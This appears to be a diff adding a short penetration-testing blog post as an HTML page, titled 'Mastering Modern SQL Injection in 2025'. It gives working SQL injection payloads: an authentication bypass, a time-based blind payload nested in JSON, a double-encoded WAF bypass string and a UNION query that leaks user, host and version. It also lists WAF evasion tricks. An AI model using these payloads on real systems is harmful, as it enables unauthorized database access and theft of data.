@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Mastering Modern SQL Injection in 2025 | JecRod</title>
+  <meta name="description" content="Real-world SQLi techniques that still work in 2025: blind, time-based, OOB, WAF bypass, HPP, and more."/>
+
+    <link rel="stylesheet" href="../assets/css/styles.css">
+</head>
+<body>
+
+  <div class="particles" id="particles"></div>
+
+  <!-- Navigation -->
+  <nav>
+    <ul>
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../index.html#projects">Projects</a></li>
+      <li><a href="../index.html#intro">About</a></li>
+      <li><a href="../index.html#blog" class="active">Blog</a></li>
+      <li><div class="toggle" id="modeToggle"></div>
+    </div></li>
+    </ul>
+    
+  </nav>
+
+  <!-- Article Header -->
+  <header class="article-header">
+    <span class="article-category">Web Security • SQL Injection</span>
+    <h1 class="article-title">Mastering Modern SQL Injection in 2025</h1>
+    <div class="article-meta">
+      <time>November 22, 2025</time> • <span>12 min read</span>
+    </div>
+  </header>
+
+  <!-- Article Content -->
+  <article class="article-content">
+
+    <p>SQL Injection is dead. Said no pentester ever.</p>
+
+    <img src="https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&q=80" alt="Terminal with SQL injection payload">
+
+    <h2>The Classic That Still Works</h2>
+    <p>In 2025, <code>' OR '1'='1' --</code> still logs you in as admin on thousands of apps. But real engagements demand more creativity.</p>
+
+    <h2>Blind Time-Based via JSON (My Favorite)</h2>
+    <pre><code>{
+  "search": "shoes",
+  "filters": {
+    "price": { "$gt": 0 },
+    "category": "'; IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1)) = 109) WAITFOR DELAY '0:0:10'--"
+  }
+}</code></pre>
+
+    <h2>WAF Bypass Arsenal 2025</h2>
+    <ul>
+      <li>HTTP Parameter Pollution (HPP)</li>
+      <li>Unicode smuggling + JSON nesting</li>
+      <li>Chunked transfer encoding tricks</li>
+      <li>Out-of-band DNS exfiltration when HTTP is blocked</li>
+    </ul>
+
+    <blockquote>
+      “If your WAF blocks ;-- try %253B%252D%252D<br>
+      If it blocks that too… well, call me.”
+    </blockquote>
+
+    <h2>One Payload to Rule Them All</h2>
+    <pre><code>' UNION ALL SELECT NULL,CONCAT(USER(),'@',@@hostname),DATABASE(),VERSION()-- -</code></pre>
+
+    <p>Works on MySQL, MariaDB, and sometimes even PostgreSQL with minor tweaks.</p>
+
+    <p>SQL Injection isn't dead — it's just wearing a better disguise.</p>
+
+  </article>
+
+  <a href="../" class="back-link">Back to Blog</a>
+
+  <footer>
+    <p>Found this useful? Have a bug bounty story?</p>
+    <p style="margin-top: 30px; font-size: 0.9rem; color: var(--text-light);">© 2025 JecRod. All rights reserved.</p>
+  </footer>
+
+  <script>
+    // Particles
+    const particlesContainer = document.getElementById('particles');
+    for (let i = 0; i < 60; i++) {
+      const p = document.createElement('div');
+      p.classList.add('particle');
+      p.style.left = Math.random() * 100 + 'vw';
+      p.style.animationDelay = Math.random() * 15 + 's';
+      p.style.animationDuration = 12 + Math.random() * 20 + 's';
+      particlesContainer.appendChild(p);
+    }
+
+    // Dark/Light Mode Toggle
+    const body = document.body;
+    const toggle = document.getElementById('modeToggle');
+    if (localStorage.getItem('theme') === 'light') body.classList.add('light-mode');
+
+    toggle.addEventListener('click', () => {
+      body.classList.toggle('light-mode');
+      localStorage.setItem('theme', body.classList.contains('light-mode') ? 'light' : 'dark');
+    });
+  </script>
+</body>
+</html>
